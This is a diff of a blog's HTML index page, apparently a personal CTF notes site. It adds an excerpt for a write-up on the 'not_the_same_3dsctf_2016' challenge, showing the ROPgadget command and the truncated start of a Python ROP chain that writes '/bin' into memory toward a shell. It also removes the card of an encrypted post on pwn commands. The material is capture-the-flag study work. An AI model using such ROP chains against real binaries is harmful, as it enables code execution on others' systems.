@@ -134,6 +134,53 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/13/ROPgadget-not_the_same_3dsctf_2016/">
+        <p class="h4 index-header">ROPgadget-not_the_same_3dsctf_2016</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">ROPgadget-not_the_same_3dsctf_2016
+
+ROPgadget --binary not_the_same_3dsctf_2016 --ropchain
+自动生成
+from struct import pack
+p = &#39;&#39;
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4
+p += p</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-13&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/01/11/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
         <p class="h4 index-header">Linux常见问题解决方法</p>
         
@@ -581,39 +628,6 @@ IP地址的低23位替换mac地址低</div>
           
             <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0">专业学习</a>&nbsp;
           
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/23/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
-        <p class="h4 index-header">Pwn常用指令</p>
-        
-        
-          
-          
-        
-        <div class="index-excerpt" style="max-height: none;">
-          <div class="index-text mb-1">The article has been encrypted, please enter your password to view....</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-23&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
-          &nbsp;
-        
         
       </div>
     </div>
